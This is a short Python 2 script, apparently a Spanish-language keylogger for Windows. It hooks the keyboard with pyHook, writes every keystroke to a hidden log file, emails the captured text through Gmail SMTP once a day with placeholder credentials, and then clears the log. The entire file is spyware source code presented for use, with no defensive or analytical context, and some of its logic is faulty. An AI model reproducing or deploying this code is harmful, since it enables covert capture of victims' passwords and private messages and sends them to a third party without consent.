import pyHook, pythoncom, sys, logging
import time, datetime
from platform import platform, os
wait_seconds = 86400
timeout = time.time() + wait_seconds
file_log = 'C:\\secret\\dat.txt'
USR = os.environ["LOGNAME"]
def TimeOut():
  if time.time() > timeout:
    return True
  else:
    return False

def SendEmail(user, pwd, recipient, subject, body):
  import smtplib

  gmail_user= user
  gmail_pass = pwd
  FROM = user
  TO = recipient if type(recipient) is list else [recipient]
  SUBJECT = subject
  TEXT = body

  message = """\From: %s\nTo: %s\nSubject: %s\n\n%s
  """ % (FROM, ", ".join(TO), SUBJECT, TEXT)
  try:
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.ehlo()
    server.starttls()
    server.login(gmail_user, gmail_pass)
    server.sendmail(FROM, TO, message)
    server.close()
    print 'Correo enviado satisfactoriamente!'
  except:
    print 'Error al mandar correo!'

def FormatAndSendLogEmail():
  with open(file_log, 'r+') as f:
    actualdate = datetime.datetime.now().strftime(" |%H:%M:%S| --- |%d de %m de %Y| ")
    data = f.read().replace('\n', '')
    data = 'La Informaación Asido Recolectada Alas'+ actualdate + '\n'+'\n'+ data
    SendEmail('tucorreo@gmail.com', 'tuclave', 'tucorreo@gmail.com',
              'Sea detectado actividad en la PC de '+USR, data)
    f.seek(0)
    f.truncate()

def OnKeyboardEvent(event):
  logging.basicConfig(filename=file_log, level=logging.DEBUG,
                      format = '%(message)s')
  logging.log(10, chr(event.Ascii))
  return True

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()

while True:
  if TimeOut():
    FormatAndSendLogEmail()
    timeout = time.time() + wait_seconds

pythoncom.PumpWaitingMessages()
